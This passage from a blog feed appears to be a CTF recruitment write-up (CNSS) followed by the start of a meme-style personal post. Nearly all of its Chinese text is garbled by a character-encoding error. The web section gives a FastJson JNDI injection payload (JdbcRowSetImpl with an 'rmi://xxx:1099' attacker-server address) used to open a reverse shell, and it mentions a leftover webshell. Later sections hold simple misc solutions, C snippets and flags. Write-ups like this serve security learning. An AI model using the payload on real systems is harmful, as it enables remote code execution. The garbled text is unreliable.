å¯†ç±»å‹ä¸º<code>AES/CBC/PKCS7Padding</code>ï¼Œä¸”éœ€è¦base64è§£å¯†</p><blockquote><p>å…³äºjndi</p><p><a href="https://blog.csdn.net/hapenl/article/details/127299130">FastJsonè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åŸºäºJNDIåå¼¹shellä½¿ç”¨_fastjsonåå¼¹shell_Hapen_Luçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>å¯åŠ¨jndiæœåŠ¡ï¼ŒvpsåŒæ—¶ç›‘å¬payloadçš„ç«¯å£</p><p>ç‰ˆæœ¬ä¸ºjar1.8ï¼Œé€‰æ‹©1.8çš„rmi</p><p><code>&#123;&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://xxx:1099/0v7hzy &quot;,&quot;autoCommit&quot;:true&#125;&#125;</code></p><p>éšä¾¿æ‰¾ä¸ªaesåŠ å¯†ç½‘ç«™</p><p><img src="/posts/43716/image-20231021002435641.png" alt="image-20231021002435641"></p><p>æ‰“å¼€ä½ çš„postå·¥å…·ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>postman</code></p><p><img src="/posts/43716/image-20231020235903632.png" alt="image-20231020235903632"></p><p>æŠŠç™»é™†çš„cookieå¤åˆ¶åˆ°postman</p><p><img src="/posts/43716/image-20231021002458070.png" alt="image-20231021002458070"></p><p>æ ¹æ®<code>com.ruoyi.project.system.config.domain.Sign</code></p><p><img src="/posts/43716/image-20231020235051990.png" alt="image-20231020235051990"></p><p>å‘é€jsonæ•°æ®</p><p><img src="/posts/43716/image-20231021002519074.png" alt="image-20231021002519074"></p><p>æŸ¥çœ‹ç›‘å¬ï¼Œå¯ä»¥å‘ç°å·²ç»è¿æ¥ä¸Šäº†</p><p><img src="/posts/43716/image-20231021002752134.png" alt="image-20231021002752134"></p><p>ï¼ˆå¦‚æœè·Ÿæˆ‘ä¸€æ ·flag1æ²¡æ‹¿åˆ°ä¹Ÿå¯ä»¥åœ¨è¿™catè·å¾—</p><p><em><strong>_to_R3m0te_COde_Ex2cuT10n!!!}</strong></em></p></blockquote><p>æ•´ç†ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;Fr0M_4rb1trA2y_f1L3_Reaol_Vuln3rab1l1Ty_to_R3m0te_COde_Ex2cuT10n!!!&#125;</code></font></center></strong></em></p><h2 id="Boss-ğŸ—¡-CNSSå¨˜ã®å¤ä»‡-1"><a href="#Boss-ğŸ—¡-CNSSå¨˜ã®å¤ä»‡-1" class="headerlink" title="[Boss] ğŸ—¡ CNSSå¨˜ã®å¤ä»‡ - 1"></a>[Boss] ğŸ—¡ CNSSå¨˜ã®å¤ä»‡ - 1</h2><p><del>è®¿é—®åˆ°&#x2F;assets&#x2F;å‘ç°åˆ«äººçš„webshellæ²¡åˆ </del></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;E4sy_Y1i2_uN5er1Aliz3_7o_RcE!&#125;</code></font></center></strong></em></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Guideline-ğŸ¥°-SignIn"><a href="#Guideline-ğŸ¥°-SignIn" class="headerlink" title="[Guideline] ğŸ¥° SignIn"></a>[Guideline] ğŸ¥° SignIn</h2><p>è·Ÿæš‘å‡èµ›ä¸€æ ·ï¼Œåœ¨qqç¾¤é‡Œï¼Œä¸ä¼šæœ‰äººæ‰¾ä¸åˆ°å§~~</p><h2 id="Baby-ğŸ§-æ‹›æ–°å¹³å°çš„å½©è›‹"><a href="#Baby-ğŸ§-æ‹›æ–°å¹³å°çš„å½©è›‹" class="headerlink" title="[Baby]ğŸ§ æ‹›æ–°å¹³å°çš„å½©è›‹"></a>[Baby]ğŸ§ æ‹›æ–°å¹³å°çš„å½©è›‹</h2><p>å·¦ä¸Šè§’ï¼ŒåŸç¥å¯åŠ¨ï¼ï¼ˆå…¶å®æˆ‘æ˜¯ç¿»æºç æ‰¾åˆ°çš„</p><h2 id="Easy-âœ¨-æ˜Ÿå…‰ä¸‹çš„æ¢¦æƒ³"><a href="#Easy-âœ¨-æ˜Ÿå…‰ä¸‹çš„æ¢¦æƒ³" class="headerlink" title="[Easy] âœ¨ æ˜Ÿå…‰ä¸‹çš„æ¢¦æƒ³"></a>[Easy] âœ¨ æ˜Ÿå…‰ä¸‹çš„æ¢¦æƒ³</h2><p>mp3æ–‡ä»¶ï¼Œä¸¢åˆ°<code>Audacity</code>åº·åº·ï¼Œå³é”®åˆ‡åˆ°é¢‘è°±å›¾</p><p><img src="/posts/43716/image-20231025174055018.png" alt="image-20231025174055018"></p><p>å¯¹äºæˆ‘è¿™ç§çœ¼ççš„å¾ˆä¸å‹å¥½</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></font></center></strong></em></p><h2 id="Hard-ğŸ‰-æ‰«ç é¢†å–-flag"><a href="#Hard-ğŸ‰-æ‰«ç é¢†å–-flag" class="headerlink" title="[Hard] ğŸ‰ æ‰«ç é¢†å– flag"></a>[Hard] ğŸ‰ æ‰«ç é¢†å– flag</h2><p>å¦‚å›¾</p><p><img src="/posts/43716/BrokenQR.png" alt="BrokenQR"></p><p><code>Format Info Pattern</code>æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“</p><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªç½‘ç«™ï¼š<a href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a></p><p><img src="/posts/43716/image-20231025175347968.png" alt="image-20231025175347968"></p><p>ç”¨<code>Brute-force Format Info Pattern</code>çˆ†ç ´</p><p>ç¨ç­‰ä¸€ä¸‹ï¼Œç‚¹å‡»å·¦ä¸Šè§’<code>Editor Mode</code>ï¼Œå‡ºç°</p><p><img src="/posts/43716/image-20231025180239074.png" alt="image-20231025180239074"></p><p>ç‚¹å‡»<code>Decode</code>å¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;Ur_Qr_K1NnG!&#125;</code></font></center></strong></em></p><h2 id="Baby-Hello-World-1"><a href="#Baby-Hello-World-1" class="headerlink" title="[Baby] Hello World - 1"></a>[Baby] Hello World - 1</h2><p>ç­¾åˆ°é¢˜</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cnss&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-2"><a href="#Easy-Hello-World-2" class="headerlink" title="[Easy] Hello World - 2"></a>[Easy] Hello World - 2</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">72</span>, <span class="hljs-number">105</span>, <span class="hljs-number">44</span>, <span class="hljs-number">32</span>, <span class="hljs-number">67</span>, <span class="hljs-number">78</span>, <span class="hljs-number">83</span>, <span class="hljs-number">83</span>, <span class="hljs-number">33</span> &#125;; <span class="hljs-comment">// Hi, CNSS!</span><br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;hello_cn33_n0_quotes&#125;</code></font></center></strong></em></p><h2 id="Easy-Hello-World-3"><a href="#Easy-Hello-World-3" class="headerlink" title="[Easy] Hello World - 3"></a>[Easy] Hello World - 3</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hi, CNSS!&quot;</span>))&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;i_d0nt_l1ke_semic0lon&#125;</code></font></center></strong></em></p><h2 id="Realworld-ğŸŒ-MCNSS"><a href="#Realworld-ğŸŒ-MCNSS" class="headerlink" title="[Realworld] ğŸŒ MCNSS"></a>[Realworld] ğŸŒ MCNSS</h2><p><em><strong><center>MCå®åœ¨æ˜¯å¤ªå¥½ç©å•¦ï¼</center></strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;a_fAke_F1aG&#125;</code></font></center></strong></em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF-Recruits</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç–¯å•¦</title>
    <link href="/posts/896/"/>
    <url>/posts/896/</url>
    
    <content type="html"><![CDATA[<h1 id="å“ˆå“ˆå“ˆä½ æ¥å•¦"><a href="#å“ˆå“ˆå“ˆä½ æ¥å•¦" class="headerlink" title="å“ˆå“ˆå“ˆä½ æ¥å•¦"></a>å“ˆå“ˆå“ˆä½ æ¥å•¦</h1><ul><li><input checked disabled type="checkbox"> <h5 id="æˆ‘æ„Ÿè§‰æˆ‘æ˜¯çœŸçš„ç–¯äº†ï¼Œæˆ‘èººåœ¨åºŠä¸Šä¼šæ„¤æ€’ï¼Œæˆ‘æ´—æ¾¡ä¼šæ„¤æ€’ï¼Œæˆ‘å‡ºé—¨ä¼šæ„¤æ€’ï¼Œæˆ‘èµ°è·¯ä¼šæ„¤æ€’ï¼Œæˆ‘åè½¦ä¼šæ„¤æ€’ï¼Œæˆ‘ç©æ‰‹æœºä¼šæ„¤æ€’ï¼Œæˆ‘çœŸçš„è§‰å¾—è‡ªå·±åƒä¸­é‚ªäº†ä¸€æ ·ï¼Œæˆ‘çš„æ„¤æ€’ä¼¼ä¹éƒ½æ˜¯ç—…æ€çš„äº†ï¼Œæˆ‘å¥½å­¤ç‹¬å•Šï¼çœŸçš„å¥½å­¤ç‹¬å•Šï¼"><a href="#æˆ‘æ„Ÿè§‰æˆ‘æ˜¯çœŸçš„ç–¯äº†ï¼Œæˆ‘èººåœ¨åºŠä¸Šä¼šæ„¤æ€’ï¼Œæˆ‘æ´—æ¾¡ä¼šæ„¤æ€’ï¼Œæˆ‘å‡ºé—¨ä¼šæ„¤æ€’ï¼Œæˆ‘èµ°è·¯ä¼šæ„¤æ€’ï¼Œæˆ‘åè½¦ä¼šæ„¤æ€’ï¼Œæˆ‘ç©æ‰‹æœºä¼šæ„¤æ€’ï¼Œæˆ‘çœŸçš„è§‰å¾—è‡ªå·±åƒä¸­é‚ªäº†ä¸€æ ·ï¼Œæˆ‘çš„æ„¤æ€’ä¼¼ä¹éƒ½æ˜¯ç—…æ€çš„äº†ï¼Œæˆ‘å¥½å­¤ç‹¬å•Šï¼çœŸçš„å¥½å­¤ç‹¬å•Šï¼" class="headerlink" title="æˆ‘æ„Ÿè§‰æˆ‘æ˜¯çœŸçš„ç–¯äº†ï¼Œæˆ‘èººåœ¨åºŠä¸Šä¼šæ„¤æ€’ï¼Œæˆ‘æ´—æ¾¡ä¼šæ„¤æ€’ï¼Œæˆ‘å‡ºé—¨ä¼šæ„¤æ€’ï¼Œæˆ‘èµ°è·¯ä¼šæ„¤æ€’ï¼Œæˆ‘åè½¦ä¼šæ„¤æ€’ï¼Œæˆ‘ç©æ‰‹æœºä¼šæ„¤æ€’ï¼Œæˆ‘çœŸçš„è§‰å¾—è‡ªå·±åƒä¸­é‚ªäº†ä¸€æ ·ï¼Œæˆ‘çš„æ„¤æ€’ä¼¼ä¹éƒ½æ˜¯ç—…æ€çš„äº†ï¼Œæˆ‘å¥½å­¤ç‹¬å•Šï¼çœŸçš„å¥½å­¤ç‹¬å•Šï¼"></a>æˆ‘æ„Ÿè§‰æˆ‘æ˜¯çœŸçš„ç–¯äº†ï¼Œæˆ‘èººåœ¨åºŠä¸Šä¼šæ„¤æ€’ï¼Œæˆ‘æ´—æ¾¡ä¼šæ„¤æ€’ï¼Œæˆ‘å‡ºé—¨ä¼šæ„¤æ€’ï¼Œæˆ‘èµ°è·¯ä¼šæ„¤æ€’ï¼Œæˆ‘åè½¦ä¼šæ„¤æ€’ï¼Œæˆ‘ç©æ‰‹æœºä¼šæ„¤æ€’ï¼Œæˆ‘çœŸçš„è§‰å¾—è‡ªå·±åƒä¸­é‚ªäº†ä¸€æ ·ï¼Œæˆ‘çš„æ„¤æ€’ä¼¼ä¹éƒ½æ˜¯ç—…æ€çš„äº†ï¼Œæˆ‘å¥½å­¤ç‹¬å•Šï¼çœŸçš„å¥½å­¤ç‹¬å•Šï¼</h5></li></ul><blockquote><h3 id="ä¸ºä»€ä¹ˆè¦ç¬‘ï¼Ÿéš¾é“çœ‹åˆ°åˆ«äººæç¬‘å°±è¦ç¬‘å—ï¼Ÿä½ çŸ¥ä¸çŸ¥é“æ¯æ¬¡æˆ‘çœ‹ä½ ç¬‘æˆ‘å°±æƒ³ç¬‘ï¼Œç¬‘å¤šäº†æˆ‘å°±é•¿ç»†çº¹äº†ï¼Œå¯¹æˆ‘çš„ç²¾ç¥å¥åº·å½±å“å¾ˆå¤§ï¼Œæˆ‘æ¯æ¬¡åŠå¤œèµ·æ¥ä¸€çœ‹è¿™äº›æç¬‘è§†é¢‘æˆ‘å°±å¤§å£°åšå«ï¼Œè§‰å¾—å®åœ¨æ˜¯å¤ªæç¬‘äº†ï¼Œä¸ºä»€ä¹ˆä½ ä¸å«ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ç¬‘ï¼Ÿéš¾é“çœ‹åˆ°åˆ«äººæç¬‘å°±è¦ç¬‘å—ï¼Ÿä½ çŸ¥ä¸çŸ¥é“æ¯æ¬¡æˆ‘çœ‹ä½ ç¬‘æˆ‘å°±æƒ³ç¬‘ï¼Œç¬‘å¤šäº†æˆ‘å°±é•¿ç»†çº¹äº†ï¼Œå¯¹æˆ‘çš„ç²¾ç¥å¥åº·å½±å“å¾ˆå¤§ï¼Œæˆ‘æ¯æ¬¡åŠå¤œèµ·æ¥ä¸€çœ‹è¿™äº›æç¬‘è§†é¢‘æˆ‘å°±å¤§å£°åšå«ï¼Œè§‰å¾—å®åœ¨æ˜¯å¤ªæç¬‘äº†ï¼Œä¸ºä»€ä¹ˆä½ ä¸å«ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç¬‘ï¼Ÿéš¾é“çœ‹åˆ°åˆ«äººæç¬‘å°±è¦ç¬‘å—ï¼Ÿä½ çŸ¥ä¸çŸ¥é“æ¯æ¬¡æˆ‘çœ‹ä½ ç¬‘æˆ‘å°±æƒ³ç¬‘ï¼Œç¬‘å¤šäº†æˆ‘å°±é•¿ç»†çº¹äº†ï¼Œå¯¹æˆ‘çš„ç²¾ç¥å¥åº·å½±å“å¾ˆå¤§ï¼Œæˆ‘æ¯æ¬¡åŠå¤œèµ·æ¥ä¸€çœ‹è¿™äº›æç¬‘è§†é¢‘æˆ‘å°±å¤§å£°åšå«ï¼Œè§‰å¾—å®åœ¨æ˜¯å¤ªæç¬‘äº†ï¼Œä¸ºä»€ä¹ˆä½ ä¸å«ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ç¬‘ï¼Ÿéš¾é“çœ‹åˆ°åˆ«äººæç¬‘å°±è¦ç¬‘å—ï¼Ÿä½ çŸ¥ä¸çŸ¥é“æ¯æ¬¡æˆ‘çœ‹ä½ ç¬‘æˆ‘å°±æƒ³ç¬‘ï¼Œç¬‘å¤šäº†æˆ‘å°±é•¿ç»†çº¹äº†ï¼Œå¯¹æˆ‘çš„ç²¾ç¥å¥åº·å½±å“å¾ˆå¤§ï¼Œæˆ‘æ¯æ¬¡åŠå¤œèµ·æ¥ä¸€çœ‹è¿™äº›æç¬‘è§†é¢‘æˆ‘å°±å¤§å£°åšå«ï¼Œè§‰å¾—å®åœ¨æ˜¯å¤ªæç¬‘äº†ï¼Œä¸ºä»€ä¹ˆä½ ä¸å«ï¼Ÿ</h3></blockquote><ul><li><h2 id="é˜´æš—çš„çˆ¬è¡Œï¼‰ï¼ˆåƒå¤´å‘ï¼‰ï¼ˆå°–å«ï¼‰ï¼ˆæ— æ„è¯†çš„ä¹±çˆ¬ï¼‰ï¼ˆå“­æ³£ï¼‰ï¼ˆæŒ å¤´ï¼‰ï¼ˆèµ°æ¥èµ°å»ï¼‰ï¼ˆç»Šå€’ï¼‰ï¼ˆæ— æ„ä¹‰åœ°å“­ï¼‰ï¼ˆé¬¼åšï¼‰ï¼ˆæé€Ÿçˆ¬è¡Œï¼‰ï¼ˆæ”»å‡»æ‰€æœ‰äººï¼‰ï¼ˆåœ¨å¤©èŠ±æ¿ä¸Šé£çªœï¼‰ï¼ˆæ‰‘åˆ°åˆ«äººè„¸ä¸Šï¼‰ï¼ˆåç©ºç¿»ç¦»å¼€ï¼‰-ï¼ˆå°–å«ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆé˜´æš—çš„çˆ¬è¡Œï¼‰-ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆé˜´æš—åœ°è •åŠ¨ï¼‰ï¼ˆç¿»æ»šï¼‰ï¼ˆæ¿€çƒˆåœ°çˆ¬åŠ¨ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆå˜¶å¼ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆé˜´æ£®çš„ä½å¼ï¼‰ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆåˆ†è£‚ï¼‰ï¼ˆèµ°ä¸Šå²¸ï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆæ‰­æ›²çš„è¡Œèµ°ï¼‰ï¼ˆä¸åˆ†å¯¹è±¡æ”»å‡»ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰"><a href="#é˜´æš—çš„çˆ¬è¡Œï¼‰ï¼ˆåƒå¤´å‘ï¼‰ï¼ˆå°–å«ï¼‰ï¼ˆæ— æ„è¯†çš„ä¹±çˆ¬ï¼‰ï¼ˆå“­æ³£ï¼‰ï¼ˆæŒ å¤´ï¼‰ï¼ˆèµ°æ¥èµ°å»ï¼‰ï¼ˆç»Šå€’ï¼‰ï¼ˆæ— æ„ä¹‰åœ°å“­ï¼‰ï¼ˆé¬¼åšï¼‰ï¼ˆæé€Ÿçˆ¬è¡Œï¼‰ï¼ˆæ”»å‡»æ‰€æœ‰äººï¼‰ï¼ˆåœ¨å¤©èŠ±æ¿ä¸Šé£çªœï¼‰ï¼ˆæ‰‘åˆ°åˆ«äººè„¸ä¸Šï¼‰ï¼ˆåç©ºç¿»ç¦»å¼€ï¼‰-ï¼ˆå°–å«ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆé˜´æš—çš„çˆ¬è¡Œï¼‰-ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆé˜´æš—åœ°è •åŠ¨ï¼‰ï¼ˆç¿»æ»šï¼‰ï¼ˆæ¿€çƒˆåœ°çˆ¬åŠ¨ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆå˜¶å¼ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆé˜´æ£®çš„ä½å¼ï¼‰ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆåˆ†è£‚ï¼‰ï¼ˆèµ°ä¸Šå²¸ï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆæ‰­æ›²çš„è¡Œèµ°ï¼‰ï¼ˆä¸åˆ†å¯¹è±¡æ”»å‡»ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰" class="headerlink" title="é˜´æš—çš„çˆ¬è¡Œï¼‰ï¼ˆåƒå¤´å‘ï¼‰ï¼ˆå°–å«ï¼‰ï¼ˆæ— æ„è¯†çš„ä¹±çˆ¬ï¼‰ï¼ˆå“­æ³£ï¼‰ï¼ˆæŒ å¤´ï¼‰ï¼ˆèµ°æ¥èµ°å»ï¼‰ï¼ˆç»Šå€’ï¼‰ï¼ˆæ— æ„ä¹‰åœ°å“­ï¼‰ï¼ˆé¬¼åšï¼‰ï¼ˆæé€Ÿçˆ¬è¡Œï¼‰ï¼ˆæ”»å‡»æ‰€æœ‰äººï¼‰ï¼ˆåœ¨å¤©èŠ±æ¿ä¸Šé£çªœï¼‰ï¼ˆæ‰‘åˆ°åˆ«äººè„¸ä¸Šï¼‰ï¼ˆåç©ºç¿»ç¦»å¼€ï¼‰ ï¼ˆå°–å«ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆé˜´æš—çš„çˆ¬è¡Œï¼‰ ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆé˜´æš—åœ°è •åŠ¨ï¼‰ï¼ˆç¿»æ»šï¼‰ï¼ˆæ¿€çƒˆåœ°çˆ¬åŠ¨ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆå˜¶å¼ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆé˜´æ£®çš„ä½å¼ï¼‰ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆåˆ†è£‚ï¼‰ï¼ˆèµ°ä¸Šå²¸ï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆæ‰­æ›²çš„è¡Œèµ°ï¼‰ï¼ˆä¸åˆ†å¯¹è±¡æ”»å‡»ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰"></a>é˜´æš—çš„çˆ¬è¡Œï¼‰ï¼ˆåƒå¤´å‘ï¼‰ï¼ˆå°–å«ï¼‰ï¼ˆæ— æ„è¯†çš„ä¹±çˆ¬ï¼‰ï¼ˆå“­æ³£ï¼‰ï¼ˆæŒ å¤´ï¼‰ï¼ˆèµ°æ¥èµ°å»ï¼‰ï¼ˆç»Šå€’ï¼‰ï¼ˆæ— æ„ä¹‰åœ°å“­ï¼‰ï¼ˆé¬¼åšï¼‰ï¼ˆæé€Ÿçˆ¬è¡Œï¼‰ï¼ˆæ”»å‡»æ‰€æœ‰äººï¼‰ï¼ˆåœ¨å¤©èŠ±æ¿ä¸Šé£çªœï¼‰ï¼ˆæ‰‘åˆ°åˆ«äººè„¸ä¸Šï¼‰ï¼ˆåç©ºç¿»ç¦»å¼€ï¼‰ ï¼ˆå°–å«ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆé˜´æš—çš„çˆ¬è¡Œï¼‰ ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆé˜´æš—åœ°è •åŠ¨ï¼‰ï¼ˆç¿»æ»šï¼‰ï¼ˆæ¿€çƒˆåœ°çˆ¬åŠ¨ï¼‰ï¼ˆæ‰­æ›²ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆå˜¶å¼ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆé˜´æ£®çš„ä½å¼ï¼‰ï¼ˆçˆ¬è¡Œï¼‰ï¼ˆåˆ†è£‚ï¼‰ï¼ˆèµ°ä¸Šå²¸ï¼‰ï¼ˆæ‰­åŠ¨ï¼‰ï¼ˆç—‰æŒ›ï¼‰ï¼ˆè •åŠ¨ï¼‰ï¼ˆæ‰­æ›²çš„è¡Œèµ°ï¼‰ï¼ˆä¸åˆ†å¯¹è±¡æ”»å‡»ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ ‘è—¤ï¼‰ï¼ˆåˆ›é£è·¯è¿‡åƒé¦™è•‰çš„çŒ´å­ï¼‰ï¼ˆæ€’å¼ï¼‰ï¼ˆå˜æˆçŒ´å­ï¼‰ï¼ˆé£è¿›åŸå§‹æ£®æ—ï¼‰ï¼ˆè¡æ 